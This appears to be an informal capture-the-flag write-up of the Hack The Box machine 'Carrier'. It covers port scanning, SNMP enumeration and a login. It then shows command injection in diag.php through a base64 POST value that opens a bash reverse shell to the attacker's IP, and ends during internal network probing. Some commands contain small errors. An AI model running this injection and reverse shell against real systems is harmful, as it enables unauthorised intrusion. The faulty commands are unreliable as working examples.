###  Carrier

#### information

21/tcp filtered ftp
22/tcp open     ssh  <span style=color:red>   OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span>
| ssh-hostkey:
|   2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 (RSA)
|   256 37:be​:​de:​07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA)
|_  256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519)
80/tcp open  <span style=color:red>   http    Apache httpd 2.4.18 ((Ubuntu))</span>
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

the [launchpad]( https://launchpad.net/ubuntu/+source/openssh/1:7.6p1-4)   tell you  the os is  [Bionic]()    where the openssh is, but  apache is not same, [Xenial]()

It is wired! so let's try Enum the [apache]().

****

 gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.105

/img (Status: 301)
/tools (Status: 301)
/doc (Status: 301)
Progress: 464 / 220561 (0.21%)^C
[!] Keyboard interrupt detected, terminating.

*****

web site have /doc directory , try   http://10.10.10.105/  it tell us  Error 45007 and 45009, It means that "License invalid or expired"  and "Default admin user password is set (see chassis serial number)"  in doc , it make me have tips!

so let try enum the udp port ! 

*****

 nmap -sU -p- --max-retries 0 10.11.1.105 --open -Pn

Not shown: 65179 open|filtered ports, 355 closed ports
PORT    STATE SERVICE
161/udp open  snmp

*****

the is port 161 , so that is [snmp]() port, so  try enum snmp with public community.

*****

 snmpwalk -v2c -c public 10.10.10.105

iso.3.6.1.2.1.47.1.1.1.1.11 = STRING: "SN#NET_45JDX23"
iso.3.6.1.2.1.47.1.1.1.1.11 = No more variables left in this MIB View (It is past the end of the MIB tree)

*****

login with the  [sn]()

another tips in http://10.10.10.105/tickets.php

'''

Rx / CastCom. IP Engineering team from one of our upstream ISP called to
report a problem with some of their routes being leaked again due to a 
misconfiguration on our end. Update 2018/06/13: Pb solved: Junior Net 
Engineer Mike D. was terminated yesterday. Updated: 2018/06/15: CastCom.
still reporting issues with 3 networks: 
10.120.15,10.120.16,10.120.17/24's, one of their VIP is having issues 
connecting by FTP to an important server in the 10.120.15.0/24 network, 
investigating... Updated 2018/06/16: No prbl. found, suspect they had 
stuck routes after the leak and cleared them manually.

'''

and the http://10.10.10.105/diag.php  , it means somebody use [ps]()   command to do this. 

it  is very amazing that we can  post with the base64 encode  command.

POST /diag.php HTTP/1.1
Host: 10.10.10.105
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.105/diag.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 70
Cookie: PHPSESSID=tohdslhr9mcvtrpemtpjj15727
Connection: close
Upgrade-Insecure-Requests: 1

check=cXVhZ2dhO2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjcvOTAwMCAwPiYx

and we get the [shell]()

as we mention  before that  hava another tips in http://10.10.10.105/tickets.php

and we get the use is root, see the [/proc/1/environ], this is a lxc container

```shell
cat /proc/1/environ
container=lxcroot
```

use the script [LinEnum.sh]()  to enum the  system  this a cron job in 

*/10 * * * * /opt/restore.sh 

this is interesting, but  we  firstly find out  what is the [ftp] ip. in the 10.120.15.0/24 network

by ** for i in  $(seq 1 255); do ping -c 10.120.15.$1 | grep ttl ; done 

64 bytes from 10.120.15.1: icmp_seq=1 ttl=64 time=0.092 ms
64 bytes from 10.120.15.10: icmp_seq=1 ttl=63 time=0.060 ms

echo a > /dev/tcp/10.120.15.10/21 && echo on

by the way, we can use the static-nmap https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap  .

so we know the ftp on 10.120.15.10, but login with anonymous  will fail.

we use the [LinEnum.sh]()  to enum the system, we found that there is the cron job

*/10 * * * * /opt/restore.sh

so we try to  use the vtysh login in the [quagga]()  version.

